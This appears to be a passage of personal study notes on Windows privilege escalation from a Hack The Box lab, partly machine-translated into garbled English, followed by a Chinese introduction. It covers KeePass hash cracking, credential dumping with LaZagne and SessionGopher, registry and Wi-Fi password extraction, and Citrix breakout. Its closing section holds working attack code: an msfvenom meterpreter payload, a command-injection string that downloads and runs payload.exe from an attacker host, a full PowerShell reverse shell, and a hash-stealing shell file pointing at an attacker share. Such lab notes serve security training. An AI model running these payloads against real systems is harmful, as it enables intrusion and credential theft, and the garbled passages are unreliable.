<p>Extracting the KeePass hash First, we use <code>keepass2john.py</code> The script extracts the hash value in Hashcat format.</p>
<pre><code>Chenduoduo@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154</code></pre>
<p>Cracking the Hash Offline We can then feed the hash into Hashcat, KeePass has a hash pattern of 13400. If successful, we may obtain a large number of credentials that can be used to access other applications/systems, or even network devices, servers, databases, etc., provided we have access to the password database used by IT personnel.</p>
<pre><code>Chenduoduo@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -&gt; iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021</code></pre>
<p>If we access the domain join system for a domain user who has a Microsoft Exchange inbox, we can use<a href="https://github.com/dafthack/MailSniper" rel="noreferrer" target="_blank">MailSniper</a> The tool attempts to search for words such as "pass", "creds", and "credentials" in the user's mailbox.</p>
<ol><li><strong>Email</strong></li></ol>
<p>When all else fails we can run<a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a> Tools that try to obtain credentials from various software. Such software includes web browsers, chat clients, databases, email, memory dumps, various system management tools, and internal password storage mechanisms (such as Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (like databases), or against specific software (like OpenVPN). The output can be saved as a standard text file or in JSON format. Let's give it a try.</p>
<ol><li>More about credentials</li></ol>
<p>We can check with <code>-h</code> Flag help menu.</p>
<ul><li>View the LaZagne Help Menu</li></ul>
<pre><code>PS C:\htb&gt;.\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}...
                   
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|! BANG BANG!                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version</code></pre>
<p>Running all LaZagne modules As we can see, we have many modules to choose from. run <code>the tool</code> Afterwards, supported applications are searched and the cleartext credentials found are returned. As the example below shows, many applications do not store credentials securely (and it is best never to store credentials!). They can be easily retrieved and used to escalate privileges locally, migrate to other systems, or access sensitive data.</p>
<pre><code>PS C:\htb&gt;.\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|! BANG BANG!                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found!!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found!!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password:! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602</code></pre>
<p>we can use<a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a> Extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY and RDP credentials. Written in PowerShell, the tool is capable of searching and decrypting stored login information for remote access tools. It can be run locally or remotely. it will search <code>HKEY_USERS</code> Hive searches for all users logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information. It can also be used to search PuTTY private key files (.ppk), Remote Desktop (.rdp) and RSA (.sdtid) files.</p>
<ol><li>Further credentials</li></ol>
<p>To run SessionGopher as the current user we need local administrator rights to obtain <code>HKEY_USERS</code> Session information is stored for each user in, but it's always worth running it as the current user to see if you can find any useful credentials.</p>
<pre><code>PS C:\htb&gt; Import-Module.\SessionGopher.ps1
 
PS C:\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher,"  _-","   m m..+     )      Brandon Arvanaghi
     \`m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source: WINLPE-SRV01\htb-student
Session: Default%20Settings
Hostname:
Username:
Password:
 
 
PuTTY Sessions
 
 
Source: WINLPE-SRV01\htb-student
Session: nix03
Hostname: nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source: WINLPE-SRV01\htb-student
SessionId: NIX03
SessionName: NIX03
Host: nix03.inlanefreight.local
Username: srvadmin
ExtraArgs:
Port: 22
Putty Session: Default Settings
</code></pre>
<p>Certain programs and Windows configurations can cause clear text passwords or other data to be stored in the registry. Although <code>Lazagne</code> and <code>SessionGopher</code> Tools such as Tools are a great way to extract credentials, but as penetration testers we should also be familiar and familiar with manually enumerating credentials.</p>
<ol><li>Clear text password storage in the registry</li></ol>
<p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" rel="noreferrer" target="_blank">Autologon</a> Is a feature that allows users to configure their Windows operating system to automatically log in to a specific user account, eliminating the need to manually enter a username and password each time it is started. However, once configured, the username and password are stored in the registry in clear text. This feature is typically used on single-user systems or when convenience outweighs security needs.</p>
<ul><li>Windows AutoLogon</li></ul>
<p>Registry keys related to Autologon can be found at Hive's <code>HKEY_LOCAL_MACHINE</code> Found in, standard users have access to:</p>
<pre><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon</code></pre>
<p>Typical configuration of an account involves manually setting the following registry keys:</p>
<p><code>AdminAutoLogon</code>——Determine whether Autologon is enabled or disabled. A value of "1" means enabled.</p>
<p><code>DefaultUserName</code> - Save the username value that will automatically log in to the account.</p>
<p><code>DefaultPassword</code> - Save the value of the previously specified user account password.</p>
<ul><li><code>AdminAutoLogon</code> - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.</li><li><code>DefaultUserName</code> - Holds the value of the username of the account that will automatically log on.</li><li><code>DefaultPassword</code> - Holds the value of the password for the user account specified previously.</li></ul>
<ul><li>Enumerating Autologons with reg.exe</li></ul>
<pre><code>C:\htb&gt;reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    &lt;SNIP&gt;
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
</code></pre>
<p><strong><code>Note:</code></strong> If you must configure Autologon for Windows systems, it is recommended to use Autologon.exe from the Sysinternals suite, which encrypts passwords into LSA secrets.</p>
<p>For Putty sessions that use a proxy connection, the credentials are stored in clear text in the registry after the session is saved.</p>
<ol><li><strong>Putty</strong></li></ol>
<pre><code>Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</code></pre>
<p>Note that access control for this registry key is tied to the user account that configured and saved the session. So to view that account we need to log in as that user and search <code>HKEY_CURRENT_USER</code> beehive. Then, if we have administrator rights, we can <code>HKEY_USERS</code> Find it in the corresponding user's hive.</p>
<p>First, we need to enumerate the available save sessions:</p>
<ul><li>List the number of meetings and search for qualifications:</li></ul>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh</code></pre>
<p>Next, we look at the discovered sessions"<code>kali%20ssh</code>" keys and values:</p>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  &lt;SNIP&gt;
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!</code></pre>
<p>In this example, we can imagine that the IT admin configured Putty for users in his environment, but unfortunately used admin credentials in the proxy connection. Passwords can be extracted and potentially reused across the network.</p>
<ol><li>Wifi Passwords</li></ol>
<p>If we use the wireless card to gain local administrator rights on a user's workstation, we can list any wireless networks they have recently connected to.</p>
<ul><li>View saved wireless networks</li></ul>
<pre><code>C:\htb&gt; netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    &lt;None&gt;

User profiles
-------------
    All User Profile: Smith Cabin
    All User Profile: Bob's iPhone
    All User Profile: EE_Guest
    All User Profile: EE_Guest 2.4
    All User Profile: ilfreight_corp</code></pre>
<p>Depending on the network configuration we can obtain the pre-shared key (see below <code>key</code> content) and potentially access the target network. Although rare, we may encounter this situation during an engagement and use these accesses to jump to another wireless network with more resources.</p>
<ul><li>Get saved wireless passwords</li></ul>
<pre><code>C:\htb&gt; netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version: 1
    Type: Wireless LAN
    Name: ilfreight_corp
    Control options:
        Connection mode: Connect automatically
        Network broadcast: Connect only if this network is broadcasting
        AutoSwitch: Do not switch to other networks
        MAC Randomization: Disabled

Connectivity settings
---------------------
    Number of SSIDs: 1
    SSID name: "ilfreight_corp"
    Network type: Infrastructure
    Radio type: [ Any Radio Type ]
    Vendor extension: Not present

Security settings
-----------------
    Authentication: WPA2-Personal
    Cipher: CCMP
    Authentication: WPA2-Personal
    Cipher: GCMP
    Security key: Present
    Key Content: ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost: Unrestricted
    Congested: No
    Approaching Data Limit: No
    Over Data Limit: No
    Roaming: No
    Cost Source: Default</code></pre>
<h2>Citrix Restricted Environment Breakthrough</h2>
<p>Many organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM, and kiosks to provide remote access solutions to meet their business needs. However, in most organizations, desktop environments implement "lockdown" measures to minimize the potential impact of malicious employees and compromised accounts on overall domain security. While these desktop restrictions may hinder threat actors, it is still possible for them to "break out" of the restricted environment.</p>
<p>Breakout basic method:</p>
<p>enter <code>dialog box</code>.</p>
<p>Use dialog box to achieve <code>command execution</code>.</p>
<p><code>Escalate privileges</code> to gain a higher level of access.</p>
<ol><li>Gain access to a <code>Dialog Box</code>.</li><li>Exploit the Dialog Box to achieve <code>command execution</code>.</li><li><code>Escalate privileges</code> to gain higher levels of access.</li></ol>
<p>In some environments where only minimal hardening is implemented, the Start menu may even have a standard shortcut for <code>cmd.exe</code>, which may help unauthorized access. However, in the highly restricted <code>blockade</code> environment, any attempt to look for "cmd.exe" or "PowerShell.exe" in the Start menu will yield no results. Likewise, access via File Explorer <code>C: \Windows\system32</code> An error is triggered that prevents direct access to critical system tools. Gaining CMD/Command Prompt access in such a restricted environment is a significant achievement as it provides extensive control over the operating system. This level of control allows attackers to collect valuable information and facilitate further escalation of privileges.</p>
<p>There are many techniques you can use to break into Citrix environments. This section won't cover every possible scenario, but we will cover the most common Citrix grouping methods.</p>
<p>Access using RDP session to build target <code>http://humongousretail.com/remote/</code>, and log in using the credentials provided below. After logging in, click <code>Default desktop</code> Get Citrix <code>launch.ica</code> file to connect to a restricted environment.</p>
<pre><code>Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
  
Import-Module C:\Users\pmorgan\Desktop\PowerUp.ps1  
Get-RegistryKeyValue -Key 'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'  
Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'

</code></pre>
<h3>Bypass path restrictions</h3>
<p>When we try to access using file explorer <code>C: \Users</code> when it is found that it is restricted and an error occurs. This indicates that Group Policy has been implemented to restrict users from browsing using File Explorer <code>C: \</code> directory on disk. In this case, Windows dialog boxes can be used to bypass the restrictions imposed by Group Policy. Once you get the Windows dialog box, the next step is usually to navigate to a folder path that contains local executables that provide interactive console access (ie: cmd.exe). Usually, we can access the file by directly entering the folder path in the file name field.</p>
<img alt="Pasted image 20260322063450" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png"/>
<p>Many desktop applications deployed through Citrix have the ability to interact with operating system files. Functions such as Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print often provide attackers with the opportunity to invoke Windows dialog boxes. In Windows, there are many ways to open a dialog box using tools such as Paint, Notepad, and WordPad. In this section we will use <code>MS Paint</code> For example.</p>
<p>Run from start menu <code>painting</code>, click <code>"File &gt; Open</code> " to open the dialog box.</p>
<img alt="Pasted image 20260322063517" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png"/>
<p>After opening the Windows Draw dialog box, we can enter in the file name field<a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" rel="noreferrer" target="_blank">UNC</a> path <code>\\127.0.0.1\c$\users\pmorgan</code>, and set File-Type to <code>All files</code>, press Enter to access the desired directory.</p>
<h3>Access SMB shares from a restricted environment</h3>
<p>Due to the restrictions in place, File Explorer does not allow direct access to the SMB share on the attacker's machine, nor to the Ubuntu server hosting the Citrix environment. However, this limitation can be bypassed by using UNC paths in Windows dialog boxes. This method can be used to facilitate file transfer from another computer.</p>
<p>Use Impacket <code>smbserver.py</code> The script starts the SMB server from the Ubuntu machine.</p>
<pre><code>root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed</code></pre>
<p>Back in your Citrix environment, launch the Draw app through the Start menu. Enter the "File" menu, select "Open", and a prompt dialog box will appear. In this Paint-related Windows dialog box, enter the UNC path as <code>\\10.13.38.95\share</code>, enter the specified Filename field. Make sure the File Type parameter is set to "All Files". Press the "Enter" key to enter the share.</p>
<p>Due to limitations within File Explorer, copying files directly is not feasible. However, another approach is to right <code>key click</code> executable files and then launch them. right click <code>pwn.exe</code> binary file and select <code>"Open</code> ", this should prompt us to run it and a command console will open.</p>
<img alt="Pasted image 20260322063739" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png"/>
<p>Executable <code>pwn.exe</code> is from <code>pwn.c</code> File compiled custom binary that opens cmd when executed.</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}</code></pre>
<p>We can then use the gained cmd permissions to copy the files from the SMB share to pmorgan's desktop directory.</p>
<img alt="Pasted image 20260322063831" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png"/>
<h3>Alternatives to Explorer</h3>
<p>In cases where you impose severe restrictions on File Explorer, you can use something like <code>Q-Dir</code> or <code>Explorer++</code> Alternative file system editors like this serve as workarounds. These tools can bypass folder restrictions enforced by Group Policy, allowing users to browse and access files and directories that would be restricted in a standard File Explorer environment.</p>
<p>It's worth noting that File Explorer was previously unable to copy files from SMB shares due to limitations. However, by utilizing <code>Explorer++</code>, the following screenshot has successfully demonstrated transferring files from <code>\\13.38.95\share</code> Location copied to belongs to user <code>pmorgan</code> Desktop features.</p>
<img alt="Pasted image 20260322063901" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png"/>
<p>Due to its speed, user-friendly interface and portability,<a href="https://explorerplusplus.com/" rel="noreferrer" target="_blank">Explorer++</a> Highly recommended and often used for such occasions. As a portable application, it can be executed directly without installation, making it a convenient option for bypassing folder restrictions set by Group Policy.</p>
<h3>Alternate registration editor</h3>
<img alt="Pasted image 20260322063935" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png"/>
<p>Likewise, when the default Registry Editor is blocked by Group Policy, an alternative Registry Editor can be used to bypass standard Group Policy restrictions.<a href="https://sourceforge.net/projects/simpregedit/" rel="noreferrer" target="_blank">Simpleregedit</a>、<a href="https://sourceforge.net/projects/uberregedit/" rel="noreferrer" target="_blank">Uberregedit</a> and<a href="https://sourceforge.net/projects/sre/" rel="noreferrer" target="_blank">SmallRegistryEditor</a> are examples of such GUI tools that facilitate editing the Windows registry without being blocked by Group Policy. These tools provide practical and effective solutions for managing registry settings and are suitable for such restricted environments.</p>
<h3>Modify existing shortcut file</h3>
<p>By modifying an existing Windows shortcut and <code>Target</code> Field sets the path to the required executable program, which can also enable unauthorized access to the folder path.</p>
<p>The following steps outline the entire process:</p>
<p><code>right click</code> Desired shortcut.</p>
<p>Choose <code>property</code>.</p>
<ol><li><code>Right-click</code> the desired shortcut.</li><li>Select <code>Properties</code>.</li></ol>
<img alt="Pasted image 20260322064024" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png"/>
<p>Within the <code>Target</code> field, modify the path to the intended folder for access.<code>Target</code> field, modify the path to access the target folder.</p>
<img alt="Pasted image 20260322064042" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png"/>
<p>Execute the shortcut command and the command key will be generated</p>
<ol><li>Execute the Shortcut and cmd will be spawned</li></ol>
<img alt="Pasted image 20260322064055" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png"/>
<p>If an existing shortcut file is not available, there are other methods to consider. One option is to transfer the existing shortcut file via an SMB server. Alternatively, we can follow <code>Generating a Malicious.lnk File</code> Use PowerShell to create a new shortcut file as mentioned in the "Interacting with Users" section under the tab. These methods provide flexibility in achieving your goals when using shortcut files.</p>
<pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
<h2>Supplementary skills</h2>
<h3>Interact with users</h3>
<p>Users are sometimes the weakest link in an organization. An overloaded employee working quickly may notice something "anomaly" on the machine while browsing a shared hard drive, clicking on a link, or running a file. As discussed in this module, Windows gives us a huge attack surface and there are many things to check when enumerating local privilege escalation vectors. When we have exhausted all options, we can consider specific means to steal credentials by listening to the user's network traffic/local commands, or attacking known vulnerable services that require user interaction. One of my favorite tricks is to place malicious files around frequently accessed file shares in an attempt to obtain user password hashes so they can be cracked offline later.</p>
<h4>traffic capture</h4>
<p>If installed <code>Wireshark</code>, non-privileged users may be able to capture network traffic because the administrator-only access to the Npcap driver option is not enabled by default.</p>
<img alt="Pasted image 20260322164838" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png"/>
<p>Here we can see a rough example of how to capture clear text FTP credentials entered by other users into the same input box. Although unlikely, if <code>Wireshark</code> Installed on the equipment we landed, it's worth trying traffic capture to see what you can capture.</p>
<img alt="Pasted image 20260322164844" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png"/>
<p>Also, let's say our customer puts us on an attacker machine in the environment. In this case it's worth running first <code>tcpdump</code> or <code>Wireshark</code> Wait for a while to see what types of traffic are traveling over the line and if you notice anything interesting. Tool Network Credentials can be run from our attack device to detect passwords and hashes from a live interface or from a pcap file. It's worth leaving the tool running in the background while evaluating, or testing with pcap to see if you can extract credentials useful for privilege escalation or lateral transfers.</p>
<h4>Process command line audit</h4>
<p>process command line</p>
<p><strong>Process command line monitoring</strong></p>
<p>When you gain a shell as a user, there may be scheduled tasks or other processes passing credentials at the command line. We can use the following script to find the process command line. It captures the process command line every two seconds and compares the current state to the previous state, outputting any differences.</p>
<pre><code>while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}</code></pre>
<p><strong>Run the monitoring script on the target host</strong> We can host the script on the attacker machine and execute it on the target host as follows.</p>
<pre><code>[Shell]
Command=2
IconFile=\\10.10.15.137\share\test.ico
[Taskbar]
Command=ToggleDesktop</code></pre>
<h3>information scraping</h3>
<pre><code>python3 mremoteng_decrypt.py -s "s1lN9UQqWy2QFv2aKVGFa2YRfFvpObytu04vyCuVQi12M0kyV3Xc0xwAlTz0aSNRiR3Rilf6Xb4XQ="

</code></pre>
<h3>Other tips</h3>
<h2>skills assessment</h2>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.137 LPORT=9919 -f exe -o payload.exe  
  
python3 -m http.server


set lhost 10.10.15.137

127.0.0.1 &amp; PowerShell -c "Invoke-WebRequest -Uri [http://10.10.15.137:8000/payload.exe](http://10.10.15.137/payload.exe) -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe"


127.0.0.1 &amp; PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.137',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


</code></pre>`,
      zh: String.raw`<h2>介绍</h2>
<p>权限提升的总体目标是将我们对特定系统的访问权限提升到组成员<code>Local Administrators</code>或<code>NT AUTHORITY\SYSTEM</code> 本地系统帐户。然而，在某些情况下，提升到系统上的其他用户就足以实现我们的目标。权限提升通常是任何攻击活动中至关重要的一步。我们需要使用获得的访问权限，或者只有在提升权限的上下文中进行会话后才能找到的某些数据（例如凭据）。在某些情况下，如果客户聘请我们进行“黄金映像”或“工作站突破”类型的评估，权限提升可能是评估的最终目标。权限提升通常对于通过网络继续实现我们的最终目标以及横向移动至关重要。</p>
<p>话虽如此，我们可能需要提升权限，原因如下：</p>
<ol><li>在测试客户端的黄金映像Windows 工作站和服务器构建是否存在缺陷时</li><li>在本地提升权限以获取对某些本地资源（例如数据库）的访问权限</li><li>在加入域的计算机上获取<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">NT AUTHORITY\System</a>级别访问权限，从而进入客户端的 Active Directory 环境</li><li>获取凭证以在客户端网络内横向移动或提升权限</li></ol>
<p>了解如何执行提权检查并<code>manually</code>在特定场景下尽可能地利用漏洞也至关重要。我们可能会遇到这样的情况：客户将我们安置在一个托管工作站上，该工作站没有互联网访问权限，防火墙严密，USB 端口也被禁用，因此我们无法加载任何工具/辅助脚本。在这种情况下，熟练掌握使用 PowerShell 和 Windows 命令行进行 Windows 提权检查至关重要。</p>
<p>系统存在巨大的攻击面。我们可以通过以下几种方式来提升权限：</p>
<ul><li>滥用Windows组权限</li><li>滥用Windows用户权限</li><li>绕过用户账户控制</li><li>滥用弱服务/文件权限</li><li>利用位修补的内核漏洞</li><li>凭证盗窃</li><li>流量捕获</li></ul>
<p><strong>场景1 - 克服网络限制</strong> 我曾经接到一个任务，在客户端提供的系统上提升权限，该系统没有网络连接，USB 端口也被屏蔽。由于网络访问控制的存在，我无法将攻击机直接接入用户网络来协助我。在评估期间，我已经发现了一个网络漏洞，其中打印机 VLAN 配置为允许通过端口 80、443 和 445 进行出站通信。我使用手动枚举方法找到了一个与权限相关的漏洞，该漏洞允许我提升权限并手动执行<code>LSASS</code>进程的内存转储。之后，我能够在打印机 VLAN 上挂载托管在攻击机上的 SMB 共享，并提取<code>LSASS</code>DMP 文件。有了这个文件，我使用<code>Mimikatz</code>离线方式检索了域管理员的 NTLM 密码哈希，我可以离线破解该哈希，并使用该哈希从客户端提供的系统访问域控制器。</p>
<p><strong>场景2 - 掠夺公开股份</strong> 在另一次评估中，我发现自己处于一个相当封闭的环境中，该环境受到良好的监控，没有任何明显的配置缺陷或正在使用的易受攻击的服务/应用程序。我发现了一个完全开放的文件共享，允许所有用户列出其内容并下载存储在其中的文件。此共享托管了环境中虚拟机的备份。我特别感兴趣的是虚拟硬盘文件（<code>.VMDK</code>和<code>.VHDX</code>文件）。我可以从 Windows VM 访问此共享，将<code>.VHDX</code>虚拟硬盘挂载为本地驱动器并浏览文件系统。从这里，我检索了<code>SYSTEM</code>、<code>SAM</code>和注册表配置单元，将它们移动到我的 Linux 攻击箱中，并使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" rel="noreferrer" target="_blank">secretsdump.py</a><code>SECURITY</code>工具提取了本地管理员密码哈希。该组织恰好使用的是黄金映像，并且可以使用本地管理员哈希通过传递哈希攻击获得几乎所有 Windows 系统的管理员访问权限。</p>
<p><strong>场景3 - 获取凭证并滥用账户权限</strong> 在最后一个场景中，我被置于一个相当封闭的网络中，目标是访问关键的数据库服务器。客户给我提供了一台带有标准域用户账户的笔记本电脑，我可以在上面加载工具。最终，我运行了<a href="https://github.com/SnaffCon/Snaffler" rel="noreferrer" target="_blank">Snaffler</a>工具来搜索文件共享中的敏感信息。我发现一些<code>.sql</code>文件包含指向他们其中一台数据库服务器上某个数据库的低权限数据库凭证。我使用本地 MSSQL 客户端，通过数据库凭证连接到数据库，启用<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noreferrer" target="_blank">xp_cmdshell</a>存储过程并获得本地命令执行权限。使用此服务帐户访问权限，我确认​​我拥有<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a>权限，这可以用来进行本地提权。我下载了一个自定义编译版本的<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a>到主机以协助提权，并成功添加了本地管理员用户。添加用户的效果并不理想，但我尝试获取信标/反向 Shell 却失败了。通过此访问权限，我能够远程访问数据库主机，并完全控制该公司其中一个客户的数据库。</p>
<p><strong>通过FreeRDP连接</strong> 我们可以通过命令行连接，使用命令<code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code>并在提示符下输入提供的密码。大多数部分都会提供用户凭证<code>htb-student</code>，但有些部分（根据具体内容）会要求您使用其他用户进行 RDP 连接，并提供备用凭证。</p>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student

[21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[21:17:27:323] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[21:17:27:648] [28158:28159] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory /home/user2/.config/freerdp
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory [/home/user2/.config/freerdp/certs]
